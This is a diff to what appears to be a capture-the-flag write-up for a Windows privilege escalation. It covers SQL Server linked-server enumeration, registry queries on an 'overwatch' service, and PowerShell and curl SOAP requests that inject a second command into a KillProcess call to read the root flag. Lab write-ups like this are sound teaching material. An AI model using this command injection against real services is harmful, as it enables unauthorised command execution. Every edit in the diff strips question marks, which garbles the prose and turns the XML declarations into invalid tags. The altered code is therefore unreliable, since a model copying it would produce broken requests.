@@ -281,7 +281,7 @@ SELECT * FROM sys.servers WHERE is_linked = 1;
 
 **Result:** A linked server named `SQL07` was discovered.
 
-> **What is a linked server?** It allows a SQL Server instance to access and execute commands against another database server remotely. It acts as a virtual bridge, enabling distributed queries across systems without needing ETL processes or manual data copying.
+> **What is a linked server** It allows a SQL Server instance to access and execute commands against another database server remotely. It acts as a virtual bridge, enabling distributed queries across systems without needing ETL processes or manual data copying.
 
 ### Step 2 — Check Login Mappings
 
@@ -460,7 +460,7 @@ Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\overwatch\Parame
 # Get full service configuration
 Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\overwatch" | Format-List *
 
-# Check the service account (what user does it run as?)
+# Check the service account (what user does it run as)
 (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\overwatch" -Name "ObjectName").ObjectName
 ```
 
@@ -497,7 +497,7 @@ Get-Process -Name "notepad" -ErrorAction SilentlyContinue
 **2. Send SOAP request to kill it:**
 ```powershell
 $killSoap = @"
-<?xml version="1.0" encoding="utf-8"?>
+<xml version="1.0" encoding="utf-8">
 <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
     <soap:Body>
         <KillProcess xmlns="http://tempuri.org/">
@@ -551,7 +551,7 @@ This tells the service to: `kill notepad` **AND THEN** `cat the root flag`.
 curl.exe -X POST http://127.0.0.1:8000/MonitorService `
   -H "Content-Type: text/xml; charset=utf-8" `
   -H "SOAPAction: http://tempuri.org/IMonitoringService/KillProcess" `
-  -d "<?xml version='1.0' encoding='utf-8'?>
+  -d "<xml version='1.0' encoding='utf-8'>
 <soap:Envelope xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'
   xmlns:xsd='http://www.w3.org/2001/XMLSchema'
   xmlns:soap='http://schemas.xmlsoap.org/soap/envelope/'>
@@ -569,7 +569,7 @@ curl.exe -X POST http://127.0.0.1:8000/MonitorService `
 
 ```powershell
 $rootSoap = @"
-<?xml version="1.0" encoding="utf-8"?>
+<xml version="1.0" encoding="utf-8">
 <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
     <soap:Body>
         <KillProcess xmlns="http://tempuri.org/">
